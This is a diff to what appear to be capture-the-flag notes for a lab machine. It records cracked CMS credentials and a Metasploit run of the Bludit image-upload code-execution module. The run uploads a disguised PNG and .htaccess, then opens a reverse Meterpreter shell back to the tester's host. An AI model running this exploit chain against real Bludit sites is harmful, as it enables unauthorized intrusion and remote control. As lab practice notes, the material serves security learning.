@@ -140,5 +140,33 @@ BLUDITUSER => fergus
 .
 .
 .
+// Got it!
+// fergus:RolandDeschain
+.
+.
+.
+msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain                                                                  
+BLUDITPASS => RolandDeschain                                                                                                                                                                                                                                             
+msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191                                                                 
+RHOSTS => 10.10.10.191                                                                                                                              
+msf5 exploit(linux/http/bludit_upload_images_exec) > run  
+                                                                                                                                                    
+[*] Started reverse TCP handler on 10.10.14.2:4444                                                                                                  
+[+] Logged in as: fergus                                                                                                                            
+[*] Retrieving UUID...                                                                                                                              
+[*] Uploading fgrkezspuD.png...                                                                                                                     
+[*] Uploading .htaccess...                                                                                                                          
+[*] Executing fgrkezspuD.png...                                                                                                                     
+[*] Sending stage (38288 bytes) to 10.10.10.191                                                                                                     
+[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.191:46760) at 2020-06-23 11:25:41 -0400
+[+] Deleted .htaccess
 
-
+meterpreter > 
+.
+.
+.
+// !!!!!
+.
+.
+.
+// Continued in meterpreterShell.bash
